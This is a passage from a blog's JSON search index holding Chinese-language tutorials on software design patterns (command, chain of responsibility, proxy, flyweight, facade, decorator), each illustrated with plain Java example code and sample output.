InterpreterPatternDemo，我们的演示类使用 Expression 类创建规则和演示表达式的解析。 步骤 1创建一个表达式接口。 步骤 2创建实现了上述接口的实体类。 步骤 3InterpreterPatternDemo 使用 Expression 类来创建规则，并解析它们。 步骤 4执行程序，输出结果： 12John is male? trueJulie is a married women? true","categories":[],"tags":[{"name":"DesignPatterns","slug":"DesignPatterns","permalink":"https://kayleh.top/tags/DesignPatterns/"}]},{"title":"命令模式","slug":"命令模式","date":"2020-06-12T02:12:06.000Z","updated":"2021-04-11T17:11:28.799Z","comments":true,"path":"command-mode/","link":"","permalink":"https://kayleh.top/command-mode/","excerpt":"命令模式 命令模式（Command Pattern）是一种数据驱动的设计模式，它属于行为型模式。请求以命令的形式包裹在对象中，并传给调用对象。调用对象寻找可以处理该命令的合适的对象，并把该命令传给相应的对象，该对象执行命令。","text":"命令模式 命令模式（Command Pattern）是一种数据驱动的设计模式，它属于行为型模式。请求以命令的形式包裹在对象中，并传给调用对象。调用对象寻找可以处理该命令的合适的对象，并把该命令传给相应的对象，该对象执行命令。 介绍意图：将一个请求封装成一个对象，从而使您可以用不同的请求对客户进行参数化。 主要解决：在软件系统中，行为请求者与行为实现者通常是一种紧耦合的关系，但某些场合，比如需要对行为进行记录、撤销或重做、事务等处理时，这种无法抵御变化的紧耦合的设计就不太合适。 何时使用：在某些场合，比如要对行为进行”记录、撤销/重做、事务”等处理，这种无法抵御变化的紧耦合是不合适的。在这种情况下，如何将”行为请求者”与”行为实现者”解耦？将一组行为抽象为对象，可以实现二者之间的松耦合。 如何解决：通过调用者调用接受者执行命令，顺序：调用者→接受者→命令。 关键代码：定义三个角色：1、received 真正的命令执行对象 2、Command 3、invoker 使用命令对象的入口 应用实例：struts 1 中的 action 核心控制器 ActionServlet 只有一个，相当于 Invoker，而模型层的类会随着不同的应用有不同的模型类，相当于具体的 Command。 优点： 1、降低了系统耦合度。 ​ 2、新的命令可以很容易添加到系统中去。 缺点： 使用命令模式可能会导致某些系统有过多的具体命令类。 使用场景：认为是命令的地方都可以使用命令模式， 比如： ​ 1、GUI 中每一个按钮都是一条命令。 ​ 2、模拟 CMD。 注意事项：系统需要支持命令的撤销(Undo)操作和恢复(Redo)操作，也可以考虑使用命令模式，见命令模式的扩展。 实现我们首先创建作为命令的接口 Order，然后创建作为请求的 Stock 类。实体命令类 BuyStock 和 SellStock，实现了 Order 接口，将执行实际的命令处理。创建作为调用对象的类 Broker，它接受订单并能下订单。 Broker 对象使用命令模式，基于命令的类型确定哪个对象执行哪个命令。CommandPatternDemo，我们的演示类使用 Broker 类来演示命令模式。 步骤1创建一个命令接口。 Order.java123public interface Order &#123; void execute();&#125; 步骤 2创建一个请求类。 Stock.java1234567891011121314public class Stock &#123; private String name = \"ABC\"; private int quantity = 10; public void buy()&#123; System.out.println(\"Stock [ Name: \"+name+\", Quantity: \" + quantity +\" ] bought\"); &#125; public void sell()&#123; System.out.println(\"Stock [ Name: \"+name+\", Quantity: \" + quantity +\" ] sold\"); &#125;&#125; 步骤 3创建实现了 Order 接口的实体类。 BuyStock.java1234567891011public class BuyStock implements Order &#123; private Stock abcStock; public BuyStock(Stock abcStock)&#123; this.abcStock = abcStock; &#125; public void execute() &#123; abcStock.buy(); &#125;&#125; SellStock.java1234567891011public class SellStock implements Order &#123; private Stock abcStock; public SellStock(Stock abcStock)&#123; this.abcStock = abcStock; &#125; public void execute() &#123; abcStock.sell(); &#125;&#125; 步骤 4创建命令调用类。 Broker.java1234567891011121314151617import java.util.ArrayList;import java.util.List; public class Broker &#123; private List&lt;Order&gt; orderList = new ArrayList&lt;Order&gt;(); public void takeOrder(Order order)&#123; orderList.add(order); &#125; public void placeOrders()&#123; for (Order order : orderList) &#123; order.execute(); &#125; orderList.clear(); &#125;&#125; 使用 Broker 类来接受并执行命令。 CommandPatternDemo.java1234567891011121314public class CommandPatternDemo &#123; public static void main(String[] args) &#123; Stock abcStock = new Stock(); BuyStock buyStockOrder = new BuyStock(abcStock); SellStock sellStockOrder = new SellStock(abcStock); Broker broker = new Broker(); broker.takeOrder(buyStockOrder); broker.takeOrder(sellStockOrder); broker.placeOrders(); &#125;&#125; 步骤 6执行程序，输出结果： 12Stock [ Name: ABC, Quantity: 10 ] boughtStock [ Name: ABC, Quantity: 10 ] sold","categories":[{"name":"设计模式","slug":"设计模式","permalink":"https://kayleh.top/categories/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/"}],"tags":[{"name":"DesignPatterns","slug":"DesignPatterns","permalink":"https://kayleh.top/tags/DesignPatterns/"}]},{"title":"责任链模式","slug":"责任链模式","date":"2020-06-11T03:48:35.000Z","updated":"2021-04-11T17:11:29.048Z","comments":true,"path":"chain-of-responsibility-model/","link":"","permalink":"https://kayleh.top/chain-of-responsibility-model/","excerpt":"责任链模式 责任链模式（Chain of Responsibility Pattern）为请求创建了一个接收者对象的链。这种模式给予请求的类型，对请求的发送者和接收者进行解耦。这种类型的设计模式属于行为型模式。","text":"责任链模式 责任链模式（Chain of Responsibility Pattern）为请求创建了一个接收者对象的链。这种模式给予请求的类型，对请求的发送者和接收者进行解耦。这种类型的设计模式属于行为型模式。 介绍意图：避免请求发送者与接收者耦合在一起，让多个对象都有可能接收请求，将这些对象连接成一条链，并且沿着这条链传递请求，直到有对象处理它为止。 主要解决：职责链上的处理者负责处理请求，客户只需要将请求发送到职责链上即可，无须关心请求的处理细节和请求的传递，所以职责链将请求的发送者和请求的处理者解耦了。 何时使用：在处理消息的时候以过滤很多道。 如何解决：拦截的类都实现统一接口。 关键代码：Handler 里面聚合它自己，在 HandlerRequest 里判断是否合适，如果没达到条件则向下传递，向谁传递之前 set 进去。 应用实例： 1、红楼梦中的”击鼓传花”。 2、JS 中的事件冒泡。 3、JAVA WEB 中 Apache Tomcat 对 Encoding 的处理，Struts2 的拦截器，jsp servlet 的 Filter。 优点： 1、降低耦合度。它将请求的发送者和接收者解耦。 2、简化了对象。使得对象不需要知道链的结构。 3、增强给对象指派职责的灵活性。通过改变链内的成员或者调动它们的次序，允许动态地新增或者删除责任。 4、增加新的请求处理类很方便。 缺点： 1、不能保证请求一定被接收。 2、系统性能将受到一定影响，而且在进行代码调试时不太方便，可能会造成循环调用。 3、可能不容易观察运行时的特征，有碍于除错。 使用场景： 1、有多个对象可以处理同一个请求，具体哪个对象处理该请求由运行时刻自动确定。 2、在不明确指定接收者的情况下，向多个对象中的一个提交一个请求。 3、可动态指定一组对象处理请求。 注意事项：在 JAVA WEB 中遇到很多应用。 实现我们创建抽象类 AbstractLogger，带有详细的日志记录级别。然后我们创建三种类型的记录器，都扩展了 AbstractLogger。每个记录器消息的级别是否属于自己的级别，如果是则相应地打印出来，否则将不打印并把消息传给下一个记录器。 步骤1创建抽象的记录器类。 AbstractLogger.java1234567891011121314151617181920212223242526public abstract class AbstractLogger &#123; public static int INFO = 1; public static int DEBUG = 2; public static int ERROR = 3; protected int level; //责任链中的下一个元素 protected AbstractLogger nextLogger; public void setNextLogger(AbstractLogger nextLogger)&#123; this.nextLogger = nextLogger; &#125; public void logMessage(int level, String message)&#123; if(this.level &lt;= level)&#123; write(message); &#125; if(nextLogger !=null)&#123; nextLogger.logMessage(level, message); &#125; &#125; abstract protected void write(String message); &#125; 步骤 2创建扩展了该记录器类的实体类。 ConsoleLogger.java1234567891011public class ConsoleLogger extends AbstractLogger &#123; public ConsoleLogger(int level)&#123; this.level = level; &#125; @Override protected void write(String message) &#123; System.out.println(\"Standard Console::Logger: \" + message); &#125;&#125; ErrorLogger.java1234567891011public class ErrorLogger extends AbstractLogger &#123; public ErrorLogger(int level)&#123; this.level = level; &#125; @Override protected void write(String message) &#123; System.out.println(\"Error Console::Logger: \" + message); &#125;&#125; FileLogger.java1234567891011public class FileLogger extends AbstractLogger &#123; public FileLogger(int level)&#123; this.level = level; &#125; @Override protected void write(String message) &#123; System.out.println(\"File::Logger: \" + message); &#125;&#125; 步骤 3创建不同类型的记录器。赋予它们不同的错误级别，并在每个记录器中设置下一个记录器。每个记录器中的下一个记录器代表的是链的一部分。 ChainPatternDemo.java1234567891011121314151617181920212223242526public class ChainPatternDemo &#123; private static AbstractLogger getChainOfLoggers()&#123; AbstractLogger errorLogger = new ErrorLogger(AbstractLogger.ERROR); AbstractLogger fileLogger = new FileLogger(AbstractLogger.DEBUG); AbstractLogger consoleLogger = new ConsoleLogger(AbstractLogger.INFO); errorLogger.setNextLogger(fileLogger); fileLogger.setNextLogger(consoleLogger); return errorLogger; &#125; public static void main(String[] args) &#123; AbstractLogger loggerChain = getChainOfLoggers(); loggerChain.logMessage(AbstractLogger.INFO, \"This is an information.\"); loggerChain.logMessage(AbstractLogger.DEBUG, \"This is a debug level information.\"); loggerChain.logMessage(AbstractLogger.ERROR, \"This is an error information.\"); &#125;&#125; 步骤 4执行程序，输出结果： 123456Standard Console::Logger: This is an information.File::Logger: This is a debug level information.Standard Console::Logger: This is a debug level information.Error Console::Logger: This is an error information.File::Logger: This is an error information.Standard Console::Logger: This is an error information.","categories":[{"name":"设计模式","slug":"设计模式","permalink":"https://kayleh.top/categories/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/"}],"tags":[{"name":"DesignPatterns","slug":"DesignPatterns","permalink":"https://kayleh.top/tags/DesignPatterns/"}]},{"title":"RESUME","slug":"RESUME","date":"2020-06-10T17:48:15.000Z","updated":"2021-04-15T15:45:55.334Z","comments":true,"path":"resume/","link":"","permalink":"https://kayleh.top/resume/","excerpt":"RESUME","text":"RESUME","categories":[],"tags":[{"name":"resume","slug":"resume","permalink":"https://kayleh.top/tags/resume/"}]},{"title":"代理模式","slug":"代理模式","date":"2020-06-09T04:46:15.000Z","updated":"2021-04-11T17:11:28.604Z","comments":true,"path":"agency-model/","link":"","permalink":"https://kayleh.top/agency-model/","excerpt":"代理模式 为其他对象提供一种代理以控制对这个对象的访问。","text":"代理模式 为其他对象提供一种代理以控制对这个对象的访问。 在代理模式（Proxy Pattern）中，一个类代表另一个类的功能。这种类型的设计模式属于结构型模式。 在代理模式中，我们创建具有现有对象的对象，以便向外界提供功能接口。 介绍意图：为其他对象提供一种代理以控制对这个对象的访问。 主要解决：在直接访问对象时带来的问题，比如说：要访问的对象在远程的机器上。在面向对象系统中，有些对象由于某些原因（比如对象创建开销很大，或者某些操作需要安全控制，或者需要进程外的访问），直接访问会给使用者或者系统结构带来很多麻烦，我们可以在访问此对象时加上一个对此对象的访问层。 何时使用：想在访问一个类时做一些控制。 如何解决：增加中间层。 关键代码：实现与被代理类组合。 应用实例： 1、Windows 里面的快捷方式。 2、猪八戒去找高翠兰结果是孙悟空变的，可以这样理解：把高翠兰的外貌抽象出来，高翠兰本人和孙悟空都实现了这个接口，猪八戒访问高翠兰的时候看不出来这个是孙悟空，所以说孙悟空是高翠兰代理类。 3、买火车票不一定在火车站买，也可以去代售点。 4、一张支票或银行存单是账户中资金的代理。支票在市场交易中用来代替现金，并提供对签发人账号上资金的控制。 5、spring aop。 优点： 1、职责清晰。 2、高扩展性。 3、智能化。 缺点： 1、由于在客户端和真实主题之间增加了代理对象，因此有些类型的代理模式可能会造成请求的处理速度变慢。 2、实现代理模式需要额外的工作，有些代理模式的实现非常复杂。 使用场景：按职责来划分，通常有以下使用场景： 1、远程代理。 2、虚拟代理。 3、Copy-on-Write 代理。 4、保护（Protect or Access）代理。 5、Cache代理。 6、防火墙（Firewall）代理。 7、同步化（Synchronization）代理。 8、智能引用（Smart Reference）代理。 注意事项： 1、和适配器模式的区别：适配器模式主要改变所考虑对象的接口，而代理模式不能改变所代理类的接口。 2、和装饰器模式的区别：装饰器模式为了增强功能，而代理模式是为了加以控制。 实现我们将创建一个 Image 接口和实现了 Image 接口的实体类。ProxyImage 是一个代理类，减少 RealImage 对象加载的内存占用。 ProxyPatternDemo，我们的演示类使用 ProxyImage 来获取要加载的 Image 对象，并按照需求进行显示。 代理模式，即Proxy，它和Adapter模式很类似。我们先回顾Adapter模式，它用于把A接口转换为B接口： 123456789public BAdapter implements B &#123; private A a; public BAdapter(A a) &#123; this.a = a; &#125; public void b() &#123; a.a(); &#125;&#125; 而Proxy模式不是把A接口转换成B接口，它还是转换成A接口： 123456789public AProxy implements A &#123; private A a; public AProxy(A a) &#123; this.a = a; &#125; public void a() &#123; this.a.a(); &#125;&#125; 合着Proxy就是为了给A接口再包一层，这不是脱了裤子放屁吗？ 当然不是。我们观察Proxy的实现A接口的方法： 123public void a() &#123; this.a.a();&#125; 这样写当然没啥卵用。但是，如果我们在调用a.a()的前后，加一些额外的代码： 1234567public void a() &#123; if (getCurrentUser().isRoot()) &#123; this.a.a(); &#125; else &#123; throw new SecurityException(\"Forbidden\"); &#125;&#125; 这样一来，我们就实现了权限检查，只有符合要求的用户，才会真正调用目标方法，否则，会直接抛出异常。 有的童鞋会问，为啥不把权限检查的功能直接写到目标实例A的内部？ 因为我们编写代码的原则有： 职责清晰：一个类只负责一件事； 易于测试：一次只测一个功能。 用Proxy实现这个权限检查，我们可以获得更清晰、更简洁的代码： A接口：只定义接口； ABusiness类：只实现A接口的业务逻辑； APermissionProxy类：只实现A接口的权限检查代理。 如果我们希望编写其他类型的代理，可以继续增加类似ALogProxy，而不必对现有的A接口、ABusiness类进行修改。 实际上权限检查只是代理模式的一种应用。Proxy还广泛应用在： 远程代理远程代理即Remote Proxy，本地的调用者持有的接口实际上是一个代理，这个代理负责把对接口的方法访问转换成远程调用，然后返回结果。Java内置的RMI机制就是一个完整的远程代理模式。 虚代理虚代理即Virtual Proxy，它让调用者先持有一个代理对象，但真正的对象尚未创建。如果没有必要，这个真正的对象是不会被创建的，直到客户端需要真的必须调用时，才创建真正的对象。JDBC的连接池返回的JDBC连接（Connection对象）就可以是一个虚代理，即获取连接时根本没有任何实际的数据库连接，直到第一次执行JDBC查询或更新操作时，才真正创建实际的JDBC连接。 保护代理保护代理即Protection Proxy，它用代理对象控制对原始对象的访问，常用于鉴权。 智能引用智能引用即Smart Reference，它也是一种代理对象，如果有很多客户端对它进行访问，通过内部的计数器可以在外部调用者都不使用后自动释放它。 我们来看一下如何应用代理模式编写一个JDBC连接池（DataSource）。我们首先来编写一个虚代理，即如果调用者获取到Connection后，并没有执行任何SQL操作，那么这个Connection Proxy实际上并不会真正打开JDBC连接。调用者代码如下： 123456789101112131415DataSource lazyDataSource = new LazyDataSource(jdbcUrl, jdbcUsername, jdbcPassword);System.out.println(\"get lazy connection...\");try (Connection conn1 = lazyDataSource.getConnection()) &#123; // 并没有实际打开真正的Connection&#125;System.out.println(\"get lazy connection...\");try (Connection conn2 = lazyDataSource.getConnection()) &#123; try (PreparedStatement ps = conn2.prepareStatement(\"SELECT * FROM students\")) &#123; // 打开了真正的Connection try (ResultSet rs = ps.executeQuery()) &#123; while (rs.next()) &#123; System.out.println(rs.getString(\"name\")); &#125; &#125; &#125;&#125; 现在我们来思考如何实现这个LazyConnectionProxy。为了简化代码，我们首先针对Connection接口做一个抽象的代理类： 12345678910111213141516public abstract class AbstractConnectionProxy implements Connection &#123; // 抽象方法获取实际的Connection: protected abstract Connection getRealConnection(); // 实现Connection接口的每一个方法: public Statement createStatement() throws SQLException &#123; return getRealConnection().createStatement(); &#125; public PreparedStatement prepareStatement(String sql) throws SQLException &#123; return getRealConnection().prepareStatement(sql); &#125; ...其他代理方法...&#125; 这个AbstractConnectionProxy代理类的作用是把Connection接口定义的方法全部实现一遍，因为Connection接口定义的方法太多了，后面我们要编写的LazyConnectionProxy只需要继承AbstractConnectionProxy，就不必再把Connection接口方法挨个实现一遍。 LazyConnectionProxy实现如下： 123456789101112131415161718192021222324public class LazyConnectionProxy extends AbstractConnectionProxy &#123; private Supplier&lt;Connection&gt; supplier; private Connection target = null; public LazyConnectionProxy(Supplier&lt;Connection&gt; supplier) &#123; this.supplier = supplier; &#125; // 覆写close方法：只有target不为null时才需要关闭: public void close() throws SQLException &#123; if (target != null) &#123; System.out.println(\"Close connection: \" + target); super.close(); &#125; &#125; @Override protected Connection getRealConnection() &#123; if (target == null) &#123; target = supplier.get(); &#125; return target; &#125;&#125; 如果调用者没有执行任何SQL语句，那么target字段始终为null。只有第一次执行SQL语句时（即调用任何类似prepareStatement()方法时，触发getRealConnection()调用），才会真正打开实际的JDBC Connection。 最后，我们还需要编写一个LazyDataSource来支持这个LazyConnecitonProxy： 123456789101112131415161718192021222324public class LazyDataSource implements DataSource &#123; private String url; private String username; private String password; public LazyDataSource(String url, String username, String password) &#123; this.url = url; this.username = username; this.password = password; &#125; public Connection getConnection(String username, String password) throws SQLException &#123; return new LazyConnectionProxy(() -&gt; &#123; try &#123; Connection conn = DriverManager.getConnection(url, username, password); System.out.println(\"Open connection: \" + conn); return conn; &#125; catch (SQLException e) &#123; throw new RuntimeException(e); &#125; &#125;); &#125; ...&#125; 我们执行代码，输出如下： 123456789get lazy connection...get lazy connection...Open connection: com.mysql.jdbc.JDBC4Connection@7a36aefa小明小红小军小白...Close connection: com.mysql.jdbc.JDBC4Connection@7a36aefa 可见第一个getConnection()调用获取到的LazyConnectionProxy并没有实际打开真正的JDBC Connection。 使用连接池的时候，我们更希望能重复使用连接。如果调用方编写这样的代码： 123456789DataSource pooledDataSource = new PooledDataSource(jdbcUrl, jdbcUsername, jdbcPassword);try (Connection conn = pooledDataSource.getConnection()) &#123;&#125;try (Connection conn = pooledDataSource.getConnection()) &#123; // 获取到的是同一个Connection&#125;try (Connection conn = pooledDataSource.getConnection()) &#123; // 获取到的是同一个Connection&#125; 调用方并不关心是否复用了Connection，但从PooledDataSource获取的Connection确实自带这个优化功能。如何实现可复用Connection的连接池？答案仍然是使用代理模式。 12345678910111213141516171819202122public class PooledConnectionProxy extends AbstractConnectionProxy &#123; // 实际的Connection: Connection target; // 空闲队列: Queue&lt;PooledConnectionProxy&gt; idleQueue; public PooledConnectionProxy(Queue&lt;PooledConnectionProxy&gt; idleQueue, Connection target) &#123; this.idleQueue = idleQueue; this.target = target; &#125; public void close() throws SQLException &#123; System.out.println(\"Fake close and released to idle queue for future reuse: \" + target); // 并没有调用实际Connection的close()方法, // 而是把自己放入空闲队列: idleQueue.offer(this); &#125; protected Connection getRealConnection() &#123; return target; &#125;&#125; 复用连接的关键在于覆写close()方法，它并没有真正关闭底层JDBC连接，而是把自己放回一个空闲队列，以便下次使用。 空闲队列由PooledDataSource负责维护： 123456789101112131415161718192021222324252627282930313233public class PooledDataSource implements DataSource &#123; private String url; private String username; private String password; // 维护一个空闲队列: private Queue&lt;PooledConnectionProxy&gt; idleQueue = new ArrayBlockingQueue&lt;&gt;(100); public PooledDataSource(String url, String username, String password) &#123; this.url = url; this.username = username; this.password = password; &#125; public Connection getConnection(String username, String password) throws SQLException &#123; // 首先试图获取一个空闲连接: PooledConnectionProxy conn = idleQueue.poll(); if (conn == null) &#123; // 没有空闲连接时，打开一个新连接: conn = openNewConnection(); &#125; else &#123; System.out.println(\"Return pooled connection: \" + conn.target); &#125; return conn; &#125; private PooledConnectionProxy openNewConnection() throws SQLException &#123; Connection conn = DriverManager.getConnection(url, username, password); System.out.println(\"Open new connection: \" + conn); return new PooledConnectionProxy(idleQueue, conn); &#125; ...&#125; 我们执行调用方代码，输出如下： 123456Open new connection: com.mysql.jdbc.JDBC4Connection@61ca2dfaFake close and released to idle queue for future reuse: com.mysql.jdbc.JDBC4Connection@61ca2dfaReturn pooled connection: com.mysql.jdbc.JDBC4Connection@61ca2dfaFake close and released to idle queue for future reuse: com.mysql.jdbc.JDBC4Connection@61ca2dfaReturn pooled connection: com.mysql.jdbc.JDBC4Connection@61ca2dfaFake close and released to idle queue for future reuse: com.mysql.jdbc.JDBC4Connection@61ca2dfa 除了第一次打开了一个真正的JDBC Connection，后续获取的Connection实际上是同一个JDBC Connection。但是，对于调用方来说，完全不需要知道底层做了哪些优化。 我们实际使用的DataSource，例如HikariCP，都是基于代理模式实现的，原理同上，但增加了更多的如动态伸缩的功能（一个连接空闲一段时间后自动关闭）。 有的童鞋会发现Proxy模式和Decorator模式有些类似。确实，这两者看起来很像，但区别在于：Decorator模式让调用者自己创建核心类，然后组合各种功能，而Proxy模式决不能让调用者自己创建再组合，否则就失去了代理的功能。Proxy模式让调用者认为获取到的是核心类接口，但实际上是代理类。","categories":[],"tags":[{"name":"DesignPatterns","slug":"DesignPatterns","permalink":"https://kayleh.top/tags/DesignPatterns/"}]},{"title":"享元模式","slug":"享元模式","date":"2020-06-09T02:05:02.000Z","updated":"2021-04-11T17:11:28.586Z","comments":true,"path":"flyweight-model/","link":"","permalink":"https://kayleh.top/flyweight-model/","excerpt":"享元 运用共享技术有效地支持大量细粒度的对象。","text":"享元 运用共享技术有效地支持大量细粒度的对象。 享元（Flyweight）的核心思想很简单：如果一个对象实例一经创建就不可变，那么反复创建相同的实例就没有必要，直接向调用方返回一个共享的实例就行，这样即节省内存，又可以减少创建对象的过程，提高运行速度。 享元模式在Java标准库中有很多应用。我们知道，包装类型如Byte、Integer都是不变类，因此，反复创建同一个值相同的包装类型是没有必要的。以Integer为例，如果我们通过Integer.valueOf()这个静态工厂方法创建Integer实例，当传入的int范围在-128~+127之间时，会直接返回缓存的Integer实例： 1234567public class Main &#123; public static void main(String[] args) throws InterruptedException &#123; Integer n1 = Integer.valueOf(100); Integer n2 = Integer.valueOf(100); System.out.println(n1 == n2); // true &#125;&#125; 对于Byte来说，因为它一共只有256个状态，所以，通过Byte.valueOf()创建的Byte实例，全部都是缓存对象。 因此，享元模式就是通过工厂方法创建对象，在工厂方法内部，很可能返回缓存的实例，而不是新创建实例，从而实现不可变实例的复用。 总是使用工厂方法而不是new操作符创建实例，可获得享元模式的好处。 在实际应用中，享元模式主要应用于缓存，即客户端如果重复请求某些对象，不必每次查询数据库或者读取文件，而是直接返回内存中缓存的数据。 我们以Student为例，设计一个静态工厂方法，它在内部可以返回缓存的对象： 123456789101112131415161718192021222324252627282930public class Student &#123; // 持有缓存: private static final Map&lt;String, Student&gt; cache = new HashMap&lt;&gt;(); // 静态工厂方法: public static Student create(int id, String name) &#123; String key = id + \"\\n\" + name; // 先查找缓存: Student std = cache.get(key); if (std == null) &#123; // 未找到,创建新对象: System.out.println(String.format(\"create new Student(%s, %s)\", id, name)); std = new Student(id, name); // 放入缓存: cache.put(key, std); &#125; else &#123; // 缓存中存在: System.out.println(String.format(\"return cached Student(%s, %s)\", std.id, std.name)); &#125; return std; &#125; private final int id; private final String name; public Student(int id, String name) &#123; this.id = id; this.name = name; &#125;&#125; 在实际应用中，我们经常使用成熟的缓存库，例如Guava的Cache，因为它提供了最大缓存数量限制、定时过期等实用功能。","categories":[{"name":"设计模式","slug":"设计模式","permalink":"https://kayleh.top/categories/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/"}],"tags":[{"name":"DesignPatterns","slug":"DesignPatterns","permalink":"https://kayleh.top/tags/DesignPatterns/"}]},{"title":"外观模式","slug":"外观模式","date":"2020-06-08T23:37:54.000Z","updated":"2021-04-11T17:11:28.834Z","comments":true,"path":"appearance-mode/","link":"","permalink":"https://kayleh.top/appearance-mode/","excerpt":"外观模式 为子系统中的一组接口提供一个一致的界面。Facade模式定义了一个高层接口，这个接口使得这一子系统更加容易使用。","text":"外观模式 为子系统中的一组接口提供一个一致的界面。Facade模式定义了一个高层接口，这个接口使得这一子系统更加容易使用。 外观模式，即Facade，是一个比较简单的模式。它的基本思想如下： 如果客户端要跟许多子系统打交道，那么客户端需要了解各个子系统的接口，比较麻烦。如果有一个统一的“中介”，让客户端只跟中介打交道，中介再去跟各个子系统打交道，对客户端来说就比较简单。所以Facade就相当于搞了一个中介。 我们以注册公司为例，假设注册公司需要三步： 向工商局申请公司营业执照； 在银行开设账户； 在税务局开设纳税号。 以下是三个系统的接口： 1234567891011121314151617181920// 工商注册:public class AdminOfIndustry &#123; public Company register(String name) &#123; ... &#125;&#125;// 银行开户:public class Bank &#123; public String openAccount(String companyId) &#123; ... &#125;&#125;// 纳税登记:public class Taxation &#123; public String applyTaxCode(String companyId) &#123; ... &#125;&#125; 如果子系统比较复杂，并且客户对流程也不熟悉，那就把这些流程全部委托给中介： 12345678910public class Facade &#123; public Company openCompany(String name) &#123; Company c = this.admin.register(name); String bankAccount = this.bank.openAccount(c.getId()); c.setBankAccount(bankAccount); String taxCode = this.taxation.applyTaxCode(c.getId()); c.setTaxCode(taxCode); return c; &#125;&#125; 这样，客户端只跟Facade打交道，一次完成公司注册的所有繁琐流程： 1Company c = facade.openCompany(\"Facade Software Ltd.\"); 很多Web程序，内部有多个子系统提供服务，经常使用一个统一的Facade入口，例如一个RestApiController，使得外部用户调用的时候，只关心Facade提供的接口，不用管内部到底是哪个子系统处理的。 更复杂的Web程序，会有多个Web服务，这个时候，经常会使用一个统一的网关入口来自动转发到不同的Web服务，这种提供统一入口的网关就是Gateway，它本质上也是一个Facade，但可以附加一些用户认证、限流限速的额外服务。","categories":[{"name":"设计模式","slug":"设计模式","permalink":"https://kayleh.top/categories/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/"}],"tags":[{"name":"DesignPatterns","slug":"DesignPatterns","permalink":"https://kayleh.top/tags/DesignPatterns/"}]},{"title":"装饰器模式","slug":"装饰器模式","date":"2020-06-08T23:10:41.000Z","updated":"2021-04-11T17:11:29.010Z","comments":true,"path":"decorator-mode/","link":"","permalink":"https://kayleh.top/decorator-mode/","excerpt":"装饰器模式 动态地给一个对象添加一些额外的职责。就增加功能来说，相比生成子类更为灵活。","text":"装饰器模式 动态地给一个对象添加一些额外的职责。就增加功能来说，相比生成子类更为灵活。 装饰器（Decorator）模式，是一种在运行期动态给某个对象的实例增加功能的方法。 我们在IO的Filter模式一节中其实已经讲过装饰器模式了。在Java标准库中，InputStream是抽象类，FileInputStream、ServletInputStream、Socket.getInputStream()这些InputStream都是最终数据源。 现在，如果要给不同的最终数据源增加缓冲功能、计算签名功能、加密解密功能，那么，3个最终数据源、3种功能一共需要9个子类。如果继续增加最终数据源，或者增加新功能，子类会爆炸式增长，这种设计方式显然是不可取的。 Decorator模式的目的就是把一个一个的附加功能，用Decorator的方式给一层一层地累加到原始数据源上，最终，通过组合获得我们想要的功能。 例如：给FileInputStream增加缓冲和解压缩功能，用Decorator模式写出来如下： 123456// 创建原始的数据源:InputStream fis = new FileInputStream(\"test.gz\");// 增加缓冲功能:InputStream bis = new BufferedInputStream(fis);// 增加解压缩功能:InputStream gis = new GZIPInputStream(bis); 或者一次性写成这样： 1234InputStream input = new GZIPInputStream( // 第二层装饰 new BufferedInputStream( // 第一层装饰 new FileInputStream(\"test.gz\") // 核心功能 )); 观察BufferedInputStream和GZIPInputStream，它们实际上都是从FilterInputStream继承的，这个FilterInputStream就是一个抽象的Decorator。我们用图把Decorator模式画出来如下： 123456789101112131415 ┌───────────┐ │ Component │ └───────────┘ ▲ ┌────────────┼─────────────────┐ │ │ │┌───────────┐┌───────────┐ ┌───────────┐│ComponentA ││ComponentB │... │ Decorator │└───────────┘└───────────┘ └───────────┘ ▲ ┌──────┴──────┐ │ │ ┌───────────┐ ┌───────────┐ │DecoratorA │ │DecoratorB │... └───────────┘ └───────────┘ 最顶层的Component是接口，对应到IO的就是InputStream这个抽象类。ComponentA、ComponentB是实际的子类，对应到IO的就是FileInputStream、ServletInputStream这些数据源。Decorator是用于实现各个附加功能的抽象装饰器，对应到IO的就是FilterInputStream。而从Decorator派生的就是一个一个的装饰器，它们每个都有独立的功能，对应到IO的就是BufferedInputStream、GZIPInputStream等。 Decorator模式有什么好处？它实际上把核心功能和附加功能给分开了。核心功能指FileInputStream这些真正读数据的源头，附加功能指加缓冲、压缩、解密这些功能。如果我们要新增核心功能，就增加Component的子类，例如ByteInputStream。如果我们要增加附加功能，就增加Decorator的子类，例如CipherInputStream。两部分都可以独立地扩展，而具体如何附加功能，由调用方自由组合，从而极大地增强了灵活性。 如果我们要自己设计完整的Decorator模式，应该如何设计？ 我们还是举个栗子：假设我们需要渲染一个HTML的文本，但是文本还可以附加一些效果，比如加粗、变斜体、加下划线等。为了实现动态附加效果，可以采用Decorator模式。 首先，仍然需要定义顶层接口TextNode： 123456public interface TextNode &#123; // 设置text: void setText(String text); // 获取text: String getText();&#125; 对于核心节点，例如`，它需要从TextNode`直接继承： 1234567891011public class SpanNode implements TextNode &#123; private String text; public void setText(String text) &#123; this.text = text; &#125; public String getText() &#123; return \"&lt;span&gt;\" + text + \"&lt;/span&gt;\"; &#125;&#125; 紧接着，为了实现Decorator模式，需要有一个抽象的Decorator类： 1234567891011public abstract class NodeDecorator implements TextNode &#123; protected final TextNode target; protected NodeDecorator(TextNode target) &#123; this.target = target; &#125; public void setText(String text) &#123; this.target.setText(text); &#125;&#125; 这个NodeDecorator类的核心是持有一个TextNode，即将要把功能附加到的TextNode实例。接下来就可以写一个加粗功能： 123456789public class BoldDecorator extends NodeDecorator &#123; public BoldDecorator(TextNode target) &#123; super(target); &#125; public String getText() &#123; return \"&lt;b&gt;\" + target.getText() + \"&lt;/b&gt;\"; &#125;&#125; 类似的，可以继续加ItalicDecorator、UnderlineDecorator等。客户端可以自由组合这些Decorator： 1234567891011121314TextNode n1 = new SpanNode();TextNode n2 = new BoldDecorator(new UnderlineDecorator(new SpanNode()));TextNode n3 = new ItalicDecorator(new BoldDecorator(new SpanNode()));n1.setText(\"Hello\");n2.setText(\"Decorated\");n3.setText(\"World\");System.out.println(n1.getText());// 输出&lt;span&gt;Hello&lt;/span&gt;System.out.println(n2.getText());// 输出&lt;b&gt;&lt;u&gt;&lt;span&gt;Decorated&lt;/span&gt;&lt;/u&gt;&lt;/b&gt;System.out.println(n3.getText());// 